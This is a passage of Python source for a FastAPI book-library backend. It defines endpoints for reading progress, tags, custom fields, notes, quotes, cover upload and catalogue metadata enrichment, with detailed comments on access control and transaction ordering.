    difference between this and re-adding the book by hand, and it is the whole
    point.
    """
    book.deleted_at = None
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/permanent", status_code=status.HTTP_204_NO_CONTENT)
def purge_book(book: BookInTrash, db: DbSession) -> None:
    """Delete one trashed book for good."""
    purged = _purge(book, db)
    db.commit()
    # After the commit. See `_purge`.
    covers.forget(purged)


@router.put("/{book_id}/status", response_model=BookOut)
def update_status(
    payload: BookStatusUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Set the caller's own reading status. Read access is enough: a status is
    personal to the member setting it and changes nothing for anyone else."""
    Reading.by(db, current_user.id).mark(book.id, payload.status)
    db.commit()
    return book_to_out(book, current_user, db)


# ── Reading progress ──────────────────────────────────────────────────────────
#
# Declared here, beside the status endpoint they cooperate with, rather than up
# with `/export` and `/search`. The route-order gotcha does not reach these:
# it is about a **literal** first segment losing to `/{book_id}`, and
# `/{book_id}/progress` shares no shape with `/{book_id}` to lose to. See
# `docs/decisions.md`.
#
# All three take `BookForRead`. Progress is personal and changes nothing for
# anybody else, exactly like status and rating, so read access is the right
# gate. Every query filters on `user_id` **as well**: the book being visible
# says nothing about whose reading of it the caller may see.


@router.get("/{book_id}/progress", response_model=list[ProgressOut])
def list_progress(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[ReadingProgress]:
    """The caller's own recorded positions, newest first.

    Never anybody else's, even on a public book. Two members reading the same
    copy is the ordinary case here, and the log is a diary rather than a shelf
    fact.
    """
    return (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .order_by(ReadingProgress.recorded_at.desc(), ReadingProgress.id.desc())
        .all()
    )


@router.post(
    "/{book_id}/progress",
    response_model=ProgressOut,
    status_code=status.HTTP_201_CREATED,
)
def add_progress(
    payload: ProgressCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> ReadingProgress:
    """Record where the caller has got to.

    Saying where you are in a book is the same claim the READING button makes,
    arrived at from the other direction, so it promotes an unstarted book
    rather than leaving a member with a page number and a status of "unread".
    The promotion itself goes through `Reading.begin`, which owns that rule
    and the date stamping under it; duplicating them here is how the two would
    drift.

    **It never sets READ, whatever the page number.** `page_count` comes from a
    metadata provider and is off by one often enough that the last page is not
    a reliable finish signal, and finishing already has an explicit control.
    """
    entry = ReadingProgress(
        user_id=current_user.id,
        book_id=book.id,
        page=payload.page,
        percent=payload.percent,
        minutes=payload.minutes,
    )
    db.add(entry)

    # The promotion rules, the unflushed-status trap and the reason
    # DID_NOT_FINISH promotes where READ does not all live on `Reading.begin`.
    Reading.by(db, current_user.id).begin(book.id)

    db.commit()
    db.refresh(entry)
    return entry


@router.delete("/{book_id}/progress/{progress_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_progress(
    progress_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    """Remove one of the caller's own entries. A mistyped page is the case.

    404 for somebody else's row and for one belonging to a different book, not
    403, for the same reason an invisible book is: a 403 would confirm the id
    exists. The book/entry pairing is enforced so an id from another book
    cannot be deleted through a book the caller happens to have access to,
    which is the rule `_note_for_edit` states for notes.

    The status is left alone. Deleting the only entry does not put the book
    back to unread: somebody pressed READING, or this endpoint did on their
    behalf, and removing a mistyped page number is not a claim about that.
    """
    entry = (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.id == progress_id,
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .first()
    )
    if entry is None:
        raise HTTPException(status_code=404, detail="Progress entry not found")
    db.delete(entry)
    db.commit()


# ── Tagging ───────────────────────────────────────────────────────────────────


@router.post("/{book_id}/tags/{tag_id}", response_model=BookOut)
def add_book_tag(
    tag_id: RowId,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag not in book.tags:
        book.tags.append(tag)
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/tags/{tag_id}", response_model=BookOut)
def remove_book_tag(
    tag_id: RowId,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    if tag is not None and tag in book.tags:
        book.tags.remove(tag)
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Custom field values, per book ─────────────────────────────────────────────
#
# **The privacy rule for these is `BookForRead` and `BookForWrite`**, which is
# the app's ordinary book access control and not a second copy of it. A value
# hangs off a book, so who may read it is decided by who may read that book, and
# both handlers below receive a `Book` the dependency has already resolved
# through the Shelf. `custom_fields.values_on` takes a `Book` rather than an id
# precisely so that this is the only way to reach one.
#
# Served here rather than on `BookOut`, like notes and quotes and unlike tags.
# Two reasons and the second is the load bearing one. A page of 25 book cards
# has no room to render them, so putting them on every listing payload would buy
# nothing; and `books_to_out` is a **7 statement** budget that a test reads out
# of its own docstring, so a field nobody displays would cost every listing in
# the app one more query.


def _custom_fields_out(book: Book, db: Session) -> list[CustomFieldValueOut]:
    """This book's filled-in fields, links resolved.

    `href` is computed here on every read rather than stored, so a value that
    reached the table without passing the write check is served as text. See
    `custom_fields.link_target`.
    """
    return [
        CustomFieldValueOut(
            field_id=filled.field.id,
            name=filled.field.name,
            kind=filled.kind,
            value=filled.value,
            href=filled.href,
        )
        for filled in custom_fields.values_on(db, book)
    ]


@router.get("/{book_id}/custom-fields", response_model=list[CustomFieldValueOut])
def get_custom_fields(book: BookForRead, db: DbSession) -> list[CustomFieldValueOut]:
    """What this book holds in the library's own fields.

    Only the fields it has something in: a book with no value for a field is
    absent from this list rather than present and empty, because clearing a
    value deletes the row. Ask `GET /api/books/custom-fields` for the ones that
    could be filled in.
    """
    return _custom_fields_out(book, db)


@router.put("/{book_id}/custom-fields/{field_id}", response_model=list[CustomFieldValueOut])
def set_custom_field(
    field_id: RowId,
    payload: CustomFieldValueUpdate,
    book: BookForWrite,
    db: DbSession,
) -> list[CustomFieldValueOut]:
    """Fill in a field on this book, or clear it with an empty value.

    One verb for both, because emptying the box and saving is what a person
    does and a client should not have to decide which of two verbs that means.

    Returns the book's whole list rather than the one value, so a client that
    has just written one is holding the same thing `GET` would give it.

    422 when the field holds a link and the value is not one: an address with
    no scheme, a `javascript:` or `data:` URL, or a host that is missing. See
    `custom_fields.link_target` for the whole list and why it is re-checked on
    every read as well as here.
    """
    field = _custom_field(field_id, db)
    try:
        custom_fields.write(db, book, field, payload.value)
    except custom_fields.Refused as refusal:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_CONTENT, detail=str(refusal)
        ) from refusal
    db.commit()
    return _custom_fields_out(book, db)


# ── Cover upload ──────────────────────────────────────────────────────────────


@router.post("/{book_id}/cover", response_model=BookOut)
async def upload_cover(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    file: Annotated[UploadFile, File()],
) -> BookOut:
    # The extension comes from the file's magic bytes, never from its name.
    data, extension = await read_image_upload(file)

    # Written into place, then the other formats of the same book removed. The
    # old order deleted first, so a failed write left the book with no cover at
    # all. See uploads.replace_image.
    replace_image(COVERS_DIR, str(book.id), extension, data)
    book.cover_url = covers.local_url(book.id, extension)
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Metadata refresh ──────────────────────────────────────────────────────────


@router.put("/{book_id}/refresh", response_model=BookOut)
async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: CurrentUser) -> BookOut:
    if not book.isbn:
        raise HTTPException(status_code=400, detail="Book has no ISBN, cannot refresh metadata")

    metadata_limiter.check(current_user.username)
    lookup_key = isbn_utils.parse(book.isbn) or book.isbn
    result = await metadata.lookup(
        lookup_key,
        settings_store.google_books_api_key(db),
        plan=settings_store.catalogue_sources(db),
    )
    if not result.found:
        raise HTTPException(**_lookup_failure(result))

    assert result.record is not None
    record = result.record

    book.title = record.title or book.title
    book.subtitle = record.subtitle
    book.author = record.author
    book.publisher = record.publisher
    book.year = record.year
    book.description = record.description

    # Only ever filled in, never cleared: a refresh whose source lacks the page
    # count should not delete the one already on the record.
    book.language = record.language or book.language
    book.page_count = record.page_count or book.page_count

    # A cover the member uploaded outranks whatever the source offers.
    if not covers.is_local(book.cover_url):
        book.cover_url = record.cover_url
        # `to_thread` rather than a direct call: this handler is a coroutine, and
        # `resolve_and_store` runs its own event loop.
        await asyncio.to_thread(_store_cover, book)

    # A refresh selects no Catalogue record. Its Classifications remain
    # external evidence until a Member selects a candidate through enrich/apply.
    #
    # **The author's authority identifier is written here, and that is not the
    # same rule.** A Classification is a fact about *this Book* and ADR 0006
    # says one reaches a Book only when a Member confirms the whole record. An
    # authority identifier is a fact about a *name*: it says which record in an
    # external file the person credited here is, it is filed under the spelling
    # rather than under the book, and nothing about the Book changes. What makes
    # it certain is the same thing that makes this handler willing to overwrite
    # the title: the record was found by this Book's own verified ISBN.
    # **Below the handler's own commit, deliberately.**
    # `record_catalogue_assertions` commits internally, which `enrich_book`
    # depends on and which must not be removed. Called above this line it
    # decided the boundary for eight fields pending on the same session, so
    # anything that ever sits between the two would leave a half refreshed Book
    # committed. The identifier write is independent of the Book row, so it
    # belongs after it.
    db.commit()
    recorded = Authorship.seen_by(db, current_user.id).record_catalogue_assertions(
        record.author_identifiers, credited=book.author
    )
    db.refresh(book)
    return _with_refusals(book_to_out(book, current_user, db), recorded)


# ── Notes ─────────────────────────────────────────────────────────────────────


@router.get("/{book_id}/notes", response_model=list[NoteOut])
def get_notes(book: BookForRead, db: DbSession) -> list[Note]:
    """Requires read access to the book. Without that check, the notes on a
    private book were readable by anyone who guessed its id."""
    return (
        db.query(Note)
        .options(joinedload(Note.author))
        .filter(Note.book_id == book.id)
        .order_by(Note.created_at, Note.id)
        .all()
    )


@router.post("/{book_id}/notes", response_model=NoteOut, status_code=status.HTTP_201_CREATED)
def add_note(
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = Note(book_id=book.id, user_id=current_user.id, content=payload.content)
    db.add(note)
    db.commit()
    db.refresh(note)
    return db.query(Note).options(joinedload(Note.author)).filter(Note.id == note.id).first()


def _note_for_edit(note_id: int, book: Book, current_user: User, db: Session) -> Note:
    """A note belonging to this book, which the caller may change.

    The book/note pairing is enforced so a note id from another book cannot be
    edited through a book the caller happens to have access to.
    """
    note = db.query(Note).filter(Note.id == note_id, Note.book_id == book.id).first()
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    if note.user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not allowed to change this note")
    return note


@router.put("/{book_id}/notes/{note_id}", response_model=NoteOut)
def edit_note(
    note_id: RowId,
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = _note_for_edit(note_id, book, current_user, db)
    note.content = payload.content
    db.commit()
    return db.query(Note).options(joinedload(Note.author)).filter(Note.id == note.id).first()


@router.delete("/{book_id}/notes/{note_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_note(
    note_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    db.delete(_note_for_edit(note_id, book, current_user, db))
    db.commit()


# ── Quotes ────────────────────────────────────────────────────────────────────
#
# The same access rules as notes, and deliberately so. A quote is visible to
# whoever can see the book it came from: the shelf is shared, and a passage one
# member copied out of a book the library holds is the library's to read.
# It is not treated like `list_progress`, which returns only the caller's own
# rows, because a reading log is a diary about a person and a quote is about
# the book. `docs/decisions.md` records the choice.


def _quotes_for(book: Book, db: Session) -> list[Quote]:
    """One book's quotes, in reading order.

    Ordered by page rather than by when they were typed, which is where notes
    and quotes part company: notes are a conversation and read in the order
    they were said, quotes are a book read front to back. `nullslast` keeps the
    unpaged ones together at the end instead of wherever SQLite puts NULL.
    """
    return (
        db.query(Quote)
        .options(joinedload(Quote.author))
        .filter(Quote.book_id == book.id)
        .order_by(nullslast(Quote.page.asc()), Quote.created_at, Quote.id)
        .all()
    )


@router.get("/{book_id}/quotes", response_model=list[QuoteOut])
def get_quotes(book: BookForRead, db: DbSession) -> list[Quote]:
    """Requires read access to the book, exactly as the notes route does.

    `BookForRead` is the whole privacy check here: it answers 404 for a book
    the caller may not see, so there is no path to the quotes on one.
    """
    return _quotes_for(book, db)


@router.post("/{book_id}/quotes", response_model=QuoteOut, status_code=status.HTTP_201_CREATED)
def add_quote(
    payload: QuoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Quote | None:
    quote = Quote(
        book_id=book.id,
        user_id=current_user.id,
        text=payload.text,
        page=payload.page,
        note=payload.note,
    )
    db.add(quote)
    db.commit()
    db.refresh(quote)
    return db.query(Quote).options(joinedload(Quote.author)).filter(Quote.id == quote.id).first()


def _quote_for_edit(quote_id: int, book: Book, current_user: User, db: Session) -> Quote:
    """A quote belonging to this book, which the caller may change.

    The book/quote pairing is enforced so a quote id from another book cannot
    be edited through a book the caller happens to have access to. Same rule,
    same reason, as `_note_for_edit`.
    """
    quote = db.query(Quote).filter(Quote.id == quote_id, Quote.book_id == book.id).first()
    if quote is None:
        raise HTTPException(status_code=404, detail="Quote not found")
    if quote.user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not allowed to change this quote")
    return quote


@router.put("/{book_id}/quotes/{quote_id}", response_model=QuoteOut)
def edit_quote(
    quote_id: RowId,
    payload: QuoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Quote | None:
    quote = _quote_for_edit(quote_id, book, current_user, db)
    quote.text = payload.text
    quote.page = payload.page
    quote.note = payload.note
    db.commit()
    return db.query(Quote).options(joinedload(Quote.author)).filter(Quote.id == quote.id).first()


@router.delete("/{book_id}/quotes/{quote_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_quote(
    quote_id: RowId,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    db.delete(_quote_for_edit(quote_id, book, current_user, db))
    db.commit()


# ── Enrichment ────────────────────────────────────────────────────────────────



@router.post("/{book_id}/enrich", response_model=BookEnrichmentOut)
async def enrich_book(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill in the fields a book is missing, from every catalogue available.

    Matched by ISBN when there is one, which runs the full merged chain, and by
    title and author otherwise, which runs the ranked search. **Which
    catalogues either of those asks is the library's own provider list**, set
    in Settings; a new install asks the DNB and K10plus together, then the
    Austrian National Library, then Open Library, then Google, and searches all
    seven. A source switched off is not asked on either path.

    **No API key is required.** This was Google-only and refused outright
    without a key, which made it useless for exactly the books the German and
    French catalogues were added for: a 978-3 ISBN that Google does not carry
    would report "no key" rather than the full record the DNB was holding.

    Only empty scalar fields are filled unless `overwrite` is set: enrichment
    adds what is missing, it does not overrule what somebody typed.
    Classifications need a selected candidate through `enrich/apply`.
    """
    metadata_limiter.check(current_user.username)
    # Present is better than absent, but never required. When a key is
    # configured Google joins the chain as its last source; when it is not,
    # everything else still answers.
    api_key = (
        settings_store.google_books_api_key(db)
        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
        else ""
    )
    # Resolved once, because this handler reaches outward twice and the two
    # halves must not be able to ask different sets of catalogues.
    #
    # **Refused up front rather than per half.** Both halves are optional on
    # their own, so without this a library with nothing switched on got the
    # lookup's 409 and then the search's failure from one request. Asking
    # nothing is one answer, not two.
    plan = settings_store.catalogue_sources(db)
    if not plan.asked:
        raise HTTPException(**_no_sources())

    # `as_match()` on both paths, and it carries no Classifications by
    # construction. That is ADR 0006 held by the type rather than by this
    # handler remembering: an unattended write has nothing to write.
    fields: dict[str, Any] | None = None
    assertions: tuple[catalogue.AuthorityAssertion, ...] = ()
    recorded = RecordedAssertions(stored=[], refused=[])
    if book.isbn:
        result = await metadata.lookup(book.isbn, api_key, plan=plan)
        # `found`, like `lookup_isbn` and `refresh_metadata`, rather than a bare
        # test for the record. This is the third consumer of a `Lookup` and the
        # only one that writes to a Book without telling the Member why nothing
        # happened, so it is the one that must not decide on a different
        # question from its two siblings.
        if result.found:
            assert result.record is not None
            fields = result.record.as_match()
            # **Only on this branch.** A record found by the Book's own ISBN
            # asserts who wrote *this* Book; the title and author search below
            # asserts who wrote something with a similar name, which is a
            # candidate and reaches the store only through
            # `POST /authors/identifiers`. `as_match()` carries no assertions,
            # so the search branch has nothing to write even by mistake, which
            # is the same property ADR 0006 gets from it for Classifications.
            #
            # Held rather than recorded here: the write happens below
            # `merge_into`, once the Book's credit line is final.
            assertions = result.record.author_identifiers

    if fields is None:
        # No ISBN, or no catalogue carries this edition under it.
        query = " ".join(part for part in (book.title, book.author) if part)
        matches = await metadata.search(query, api_key, limit=1, plan=plan)
        if matches:
            fields = matches[0].as_match()

    if fields is None:
        return BookEnrichmentOut(
            book=_with_refusals(book_to_out(book, current_user, db), recorded),
            updated_fields=[],
            found=False,
        )

    updated = google_books.merge_into(book, fields, overwrite=overwrite)
    # This route chooses no Catalogue record. Its classification evidence must
    # not reach the Book or be reported as an updated field.
    if updated:
        # `to_thread` because this handler is a coroutine. See refresh_metadata.
        await asyncio.to_thread(_store_cover, book)
        db.commit()
        db.refresh(book)

    # **Below `merge_into`, and below the commit, and both matter.**
    #
    # Below `merge_into` because it skips `author` whenever the Book already has
    # one and `overwrite` is false, which is the default. Recorded above it, the
    # credit line was whatever it had been, the catalogue's spelling of the
    # author had never been adopted, and identifiers were filed under spellings
    # no Book carried: invisible, undeletable, reported as stored.
    #
    # Below the commit for the reason `refresh_metadata` states: this helper
    # commits internally, so between `merge_into` and `db.commit()` it decided
    # the transaction boundary for the Book's own pending fields, with
    # `_store_cover` sitting in the gap. That is safe today only because
    # `covers.resolve_and_store` does not raise, which is a property of another
    # module rather than of this one. Here nothing of the Book's is pending.
    recorded = Authorship.seen_by(db, current_user.id).record_catalogue_assertions(
        assertions, credited=book.author
    )

    return BookEnrichmentOut(
        book=_with_refusals(book_to_out(book, current_user, db), recorded),
        updated_fields=updated,
        found=True,
    )


@router.post("/{book_id}/enrich/apply", response_model=BookEnrichmentOut)
def apply_enrichment(
    payload: BookMatch,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill this book in from an edition the member picked.

    Separate from `POST /enrich`, which chooses for them. This exists because
    choosing automatically is wrong often enough to matter: a paperback and its
    hardback are different page counts and different covers, and a search will
    happily return the wrong printing of the right book. Nothing is written
    until somebody has looked at the candidates and said which one it is.

    The merge rule is the same either way, and it is the server's rather than
    the client's: only empty fields are filled unless `overwrite` is set, so a
    publisher somebody typed in by hand is never quietly replaced.

    Selecting the row also confirms its Classifications. Automatic enrichment
    and refresh do not have that confirmation.
    """
    updated = google_books.merge_into(
        book,
        payload.model_dump(exclude={"source", "suggested_tag_ids", "classifications"}),
        overwrite=overwrite,
    )
    # Already validated and already bounded by `BookMatch`, so the payload's
    # own models go in rather than a second pass through `classifications.bounded_headings`.
    if add_headings(book, payload.classifications, db):
        updated.append("classifications")
    if updated:
        _store_cover(book)
        db.commit()
        db.refresh(book)

    return BookEnrichmentOut(
        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
    )


@router.get("/{book_id}/enrich/candidates", response_model=list[BookMatch])
async def enrichment_candidates(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[BookMatch]:
    """Other editions of this book, so the right one can be chosen.

    Useful when the automatic match picks a different printing: the page count
    and cover of a paperback and its hardback are not the same.

    **Two routes, and `metadata.candidates` holds the rule between them.** Open
    Library's work cluster answers this exactly, when it has the book; the
    search across every catalogue answers it approximately, for everything
    else, and is ranked so a German edition of a German book is not buried
    under whatever Google happened to return first.
    """
    metadata_limiter.check(current_user.username)
    api_key = (
        settings_store.google_books_api_key(db)
        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
        else ""
    )
    query = " ".join(part for part in (book.title, book.author) if part)

    plan = settings_store.catalogue_sources(db)
    if not plan.searched:
        raise HTTPException(**_no_sources())

    matches = await metadata.candidates(
        query,
        api_key,
        isbn=book.isbn,
        limit=5,
        prefer_language=book.language,
        plan=plan,
    )
    return _match_rows(matches, all_tags=None)


@router.patch("/{book_id}/ownership", response_model=BookOut)
def set_ownership(
    payload: OwnershipUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.ownership = payload.ownership
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/rating", response_model=BookOut)
def set_rating(
    payload: BookRatingUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Rate a book, or clear the rating with a null.

    Read access, like status, and for the same reason: a rating is one person's
    opinion and changes nothing for anyone else. It deliberately does not touch
    the reading dates, because rating a book is not a claim about having
    finished it just now.
    """
    Reading.by(db, current_user.id).rate(book.id, payload.rating)
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/discuss", response_model=BookOut)
def set_discuss(
    payload: BookDiscussUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Offer to talk about this book, or withdraw the offer.

    Read access, like status and rating: it is the caller's own flag on a book
    they can see, and it changes nothing about the book itself.

    Unlike those two it is **read by everybody**, which is the point. It says
    nothing about whether the caller has read the book; `my_status` stays
    private.

    Creates the `user_books` row when there is none, exactly as the status and
    rating paths do: absence of a row means unread, not the absence of a
    member.
    """
    Reading.by(db, current_user.id).offer_to_discuss(book.id, payload.wants_to_discuss)
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}", response_model=BookOut)
def update_book_details(
    payload: BookDetailsUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Correct the catalogue entry by hand.

    `exclude_unset` is what makes a partial update partial: an absent field is
    left alone and an explicit null clears. Without it every unsent field would
    arrive as None and wipe the record, which is the classic PATCH bug.
    """
    for field, value in payload.model_dump(exclude_unset=True).items():
        setattr(book, field, value)

    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)
